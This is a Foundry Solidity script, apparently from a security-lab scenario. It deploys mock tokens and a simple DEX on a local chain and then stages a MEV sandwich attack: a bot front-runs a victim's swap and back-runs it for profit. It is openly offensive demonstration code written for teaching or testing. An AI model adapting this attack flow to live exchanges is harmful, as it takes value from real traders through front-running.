// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "../../../shared/contracts/MockERC20.sol";
import "../src/victim/SimpleDEX.sol";
import "../src/attacker/SandwichAttacker.sol";

/**
 * @title RunAll
 * @notice Deploys SimpleDEX, generates normal activity, then executes
 *         a sandwich attack: front-run buy, victim swap, back-run sell.
 *
 *         Run: DEPLOYER_KEY=... USER1_KEY=... USER2_KEY=... ATTACKER_KEY=... \
 *              forge script scenarios/mev-sandwich/script/RunAll.s.sol \
 *              --rpc-url http://127.0.0.1:8545 --broadcast
 */
contract RunAll is Script {
    function run() external {
        uint256 deployerKey = vm.envUint("DEPLOYER_KEY");

        // ============================================================
        // Phase 1: Deploy tokens and DEX, seed liquidity
        // ============================================================
        vm.startBroadcast(deployerKey);

        MockERC20 tokenA = new MockERC20("Token Alpha", "ALPHA", 18);
        MockERC20 tokenB = new MockERC20("Token Beta", "BETA", 18);
        SimpleDEX dex = new SimpleDEX(address(tokenA), address(tokenB));

        // Seed pool with 500k of each token (1:1 initial price)
        tokenA.mint(msg.sender, 1_000_000e18);
        tokenB.mint(msg.sender, 1_000_000e18);
        tokenA.approve(address(dex), 500_000e18);
        tokenB.approve(address(dex), 500_000e18);
        dex.addLiquidity(500_000e18, 500_000e18);

        console.log("SimpleDEX:", address(dex));
        console.log("TokenA (ALPHA):", address(tokenA));
        console.log("TokenB (BETA):", address(tokenB));

        vm.stopBroadcast();

        // ============================================================
        // Phase 2: Normal activity — legitimate user swaps
        // ============================================================
        uint256 user1Key = vm.envUint("USER1_KEY");
        vm.startBroadcast(user1Key);

        // User1 does a small swap: tokenA -> tokenB
        tokenA.mint(msg.sender, 10_000e18);
        tokenA.approve(address(dex), 1_000e18);
        dex.swap(address(tokenA), 1_000e18);

        // User1 swaps back some tokenB -> tokenA
        tokenB.approve(address(dex), 500e18);
        dex.swap(address(tokenB), 500e18);

        vm.stopBroadcast();

        // ============================================================
        // Phase 3: Sandwich attack
        // ============================================================
        uint256 attackerKey = vm.envUint("ATTACKER_KEY");
        uint256 victimKey = vm.envUint("USER2_KEY");

        // Step 3a: Deploy sandwich bot and fund it
        vm.startBroadcast(attackerKey);
        SandwichAttacker bot = new SandwichAttacker(address(dex));
        tokenA.mint(address(bot), 50_000e18);
        tokenB.mint(address(bot), 50_000e18);
        console.log("SandwichAttacker:", address(bot));
        vm.stopBroadcast();

        // Step 3b: Front-run — bot buys tokenB with 50k tokenA
        //          This moves the tokenA->tokenB price up significantly
        vm.startBroadcast(attackerKey);
        bot.frontrun(address(tokenA), 50_000e18);
        vm.stopBroadcast();

        // Step 3c: Victim swap — user buys tokenB with tokenA
        //          Gets a worse exchange rate due to the front-run
        vm.startBroadcast(victimKey);
        tokenA.mint(msg.sender, 5_000e18);
        tokenA.approve(address(dex), 5_000e18);
        dex.swap(address(tokenA), 5_000e18);
        vm.stopBroadcast();

        // Step 3d: Back-run — bot sells all tokenB back for tokenA
        //          Captures profit from the price impact
        vm.startBroadcast(attackerKey);
        uint256 botTokenB = tokenB.balanceOf(address(bot));
        bot.backrun(address(tokenB), botTokenB);
        bot.withdrawAll(address(tokenA));
        bot.withdrawAll(address(tokenB));
        console.log("Sandwich attack complete");
        vm.stopBroadcast();
    }
}
